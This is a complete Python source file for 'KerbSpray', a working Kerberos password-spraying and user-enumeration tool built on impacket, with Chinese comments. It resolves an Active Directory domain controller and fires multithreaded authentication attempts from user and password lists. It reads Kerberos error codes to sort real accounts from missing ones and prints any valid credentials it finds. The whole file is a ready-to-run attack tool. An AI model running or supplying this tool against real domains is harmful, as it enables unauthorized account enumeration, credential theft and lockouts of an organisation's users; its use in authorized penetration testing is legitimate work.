#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import threading
import socket
from queue import Queue

import dns.resolver
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.types import Principal

# Banner
BANNER = r"""
  _  __     _                 ____
 | |/ /    | |               |  _ \
 | ' / ___ | |__   __ _ _ __ | |_) | __ _ _ __ ___
 |  < / _ \| '_ \ / _` | '_ \|  _ < / _` | '_ ` _ \
 | . \ (_) | |_) | (_| | |_) | |_) | (_| | | | | | |
 |_|\_\___/|_.__/ \__,_| .__/|____/ \__,_|_| |_| |_|
                       |_|
    KerbSpray v1.0 - Kerberos Password Spraying Tool
            (C) 2026 Security Research Lab
"""

# 关键 Kerberos 错误码（RFC 4120，用于枚举/结果判定）
#   6  = KDC_ERR_C_PRINCIPAL_UNKNOWN  —— 用户不存在
#   24 = KDC_ERR_PREAUTH_FAILED       —— 密码错误（用户存在）
#   18 = KDC_ERR_CLIENT_REVOKED       —— 账号被禁用/吊销
#   23 = KDC_ERR_KEY_EXPIRED          —— 密码已过期
#   9  = KDC_ERR_NULL_KEY             —— 空密钥（可能被禁用）
#   14 = KDC_ERR_ETYPE_NOSUPP         —— 不支持该加密类型
#   25 = KDC_ERR_PREAUTH_REQUIRED     —— 需要预认证


class KerbSpray:
    def __init__(self, domain, dc_ip=None, users=None, passwords=None,
                 enum_only=False, threads=10, output=None, reverse=False):
        self.domain = domain.upper() if domain else None
        self.dc_ip = dc_ip
        self.users = users or []
        self.passwords = passwords or []
        self.enum_only = enum_only
        self.threads = threads
        self.output = output
        self.reverse = reverse
        self.results = []
        self.lock = threading.Lock()
        self.queue = Queue()
        self.stop = False

    def resolve_dc(self):
        if self.dc_ip:
            return self.dc_ip
        try:
            answers = dns.resolver.resolve('_kerberos._tcp.{}'.format(self.domain), 'SRV')
            for rdata in answers:
                return str(rdata.target).rstrip('.')
        except Exception:
            pass
        try:
            return socket.gethostbyname(self.domain)
        except Exception:
            return None

    @staticmethod
    def describe_error(code):
        """用 impacket 自带的错误码表返回可读描述，保证语义准确。"""
        entry = constants.ERROR_MESSAGES.get(code)
        if entry:
            return "{} - {}".format(entry[0], entry[1])
        return "Unknown error code {}".format(code)

    def test_credential(self, user, password):
        if not self.domain:
            return -1, "Domain not specified"
        try:
            # 正确调用方式（对照 impacket 的 GetTGT.py）：
            #   - clientName 必须是 Principal 对象，而非普通字符串
            #   - lmhash / nthash 传空串 '' 表示“用明文密码做 AS-REQ”
            #   - DC 地址通过 kdcHost 传入（没有 dc_ip 这个关键字）
            #   - 返回 4 元组 (tgt, cipher, key, sessionKey)
            userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, key, sessionKey = getKerberosTGT(
                userName, password, self.domain,
                '', '',                 # lmhash, nthash 为空 => 使用密码
                kdcHost=self.dc_ip,
            )
            return 0, "SUCCESS (valid credentials)"
        except KerberosError as e:
            code = e.getErrorCode()
            return code, self.describe_error(code)
        except (socket.error, ConnectionError, TimeoutError) as e:
            return -1, "Network error: {}".format(e)
        except Exception as e:
            return -1, "Unknown error: {}".format(e)

    def worker(self):
        while not self.queue.empty() and not self.stop:
            try:
                user, password = self.queue.get(timeout=1)
            except Exception:
                break

            if self.enum_only:
                test_pass = "InvalidPasswordForEnum"
                status, msg = self.test_credential(user, test_pass)
                # 6 = KDC_ERR_C_PRINCIPAL_UNKNOWN => 用户不存在；其余 => 用户存在
                if status == 6:
                    result = (user, "NOT_EXIST", "User not found")
                else:
                    result = (user, "EXISTS", "User exists (or other error)")
                with self.lock:
                    self.results.append(result)
                    if self.output:
                        with open(self.output, 'a') as f:
                            f.write("{}: {} - {}\n".format(user, result[1], result[2]))
                self.queue.task_done()
                continue

            status, msg = self.test_credential(user, password)
            if status == 0:
                result = (user, password, "SUCCESS")
                with self.lock:
                    self.results.append(result)
                    print("[+] {}:{} -> SUCCESS".format(user, password))
                    if self.output:
                        with open(self.output, 'a') as f:
                            f.write("[+] {}:{} -> SUCCESS\n".format(user, password))
            else:
                result = (user, password, msg)
                with self.lock:
                    self.results.append(result)
                    if self.output:
                        with open(self.output, 'a') as f:
                            f.write("[-] {}:{} -> {} (code {})\n".format(user, password, msg, status))
            self.queue.task_done()

    def run(self):
        if not self.users:
            print("[!] No users provided.")
            return
        if not self.enum_only and not self.passwords:
            print("[!] No passwords provided (use --enum-only for enumeration).")
            return
        if not self.domain:
            print("[!] Domain is required.")
            return

        dc = self.resolve_dc()
        if not dc:
            print("[!] Could not resolve Domain Controller. Please specify --dc-ip.")
            return
        self.dc_ip = dc
        print("[*] Target Domain: {}, DC: {}".format(self.domain, self.dc_ip))

        tasks = []
        if self.reverse:
            # 反向喷洒：每个密码 × 所有用户（符合防锁定策略）
            for pwd in self.passwords:
                for user in self.users:
                    tasks.append((user, pwd))
        else:
            # 正向爆破：每个用户 × 所有密码
            for user in self.users:
                for pwd in self.passwords:
                    tasks.append((user, pwd))

        if self.enum_only:
            print("[*] Enumeration mode: Checking {} users...".format(len(self.users)))
            tasks = [(user, "InvalidPasswordForEnum") for user in self.users]

        for task in tasks:
            self.queue.put(task)

        print("[*] Starting {} threads, total {} tasks...".format(self.threads, self.queue.qsize()))
        threads = []
        for _ in range(min(self.threads, self.queue.qsize())):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print("\n[*] Scan completed.")
        if self.enum_only:
            exists = [r for r in self.results if r[1] == "EXISTS"]
            not_exists = [r for r in self.results if r[1] == "NOT_EXIST"]
            print("[+] Existing users: {}".format(len(exists)))
            for u, _, _ in exists:
                print("    {}".format(u))
            print("[-] Non-existing users: {}".format(len(not_exists)))
            for u, _, _ in not_exists:
                print("    {}".format(u))
        else:
            success = [r for r in self.results if r[2] == "SUCCESS"]
            if success:
                print("[+] Valid credentials found:")
                for user, pwd, _ in success:
                    print("    {}:{}".format(user, pwd))
            else:
                print("[!] No valid credentials found.")

            # 失败原因归类（帮助识别“用户不存在”与“密码错误”）
            from collections import Counter
            reasons = Counter(r[2] for r in self.results if r[2] != "SUCCESS")
            if reasons:
                print("\n[*] Failure breakdown:")
                for msg, cnt in reasons.most_common():
                    print("    {} x {}".format(msg, cnt))

            # 明确列出“不存在的用户”，方便清理 user.txt（例如残留的空行/EOF）
            unknown_users = sorted({r[0] for r in self.results
                                    if r[2].startswith("KDC_ERR_C_PRINCIPAL_UNKNOWN")})
            if unknown_users:
                print("\n[!] Users that DO NOT exist (consider removing from user list):")
                for u in unknown_users:
                    print("    {}".format(u))


def parse_args():
    parser = argparse.ArgumentParser(description="Kerberos Password Spraying Tool with Enumeration Support")
    parser.add_argument("-d", "--domain", required=True, help="Domain name (e.g., domain.local)")
    parser.add_argument("-dc", "--dc-ip", help="Domain Controller IP address (if not provided, auto-resolve)")
    parser.add_argument("-u", "--users", required=True, help="File containing usernames (one per line)")
    parser.add_argument("-p", "--passwords", help="File containing passwords (one per line)")
    parser.add_argument("--enum-only", action="store_true", help="Only enumerate valid users (no password spray)")
    parser.add_argument("--reverse", action="store_true", help="Reverse spray: for each password, try all users")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-o", "--output", help="Output file to write results")
    return parser.parse_args()


def main():
    print(BANNER)
    args = parse_args()

    try:
        with open(args.users, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print("[!] Failed to read users file: {}".format(e))
        sys.exit(1)

    passwords = []
    if not args.enum_only:
        if not args.passwords:
            print("[!] Passwords file required unless using --enum-only.")
            sys.exit(1)
        try:
            with open(args.passwords, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print("[!] Failed to read passwords file: {}".format(e))
            sys.exit(1)

    if args.enum_only:
        passwords = ["InvalidPasswordForEnum"]

    sprayer = KerbSpray(
        domain=args.domain,
        dc_ip=args.dc_ip,
        users=users,
        passwords=passwords,
        enum_only=args.enum_only,
        threads=args.threads,
        output=args.output,
        reverse=args.reverse
    )

    sprayer.run()


if __name__ == "__main__":
    main()
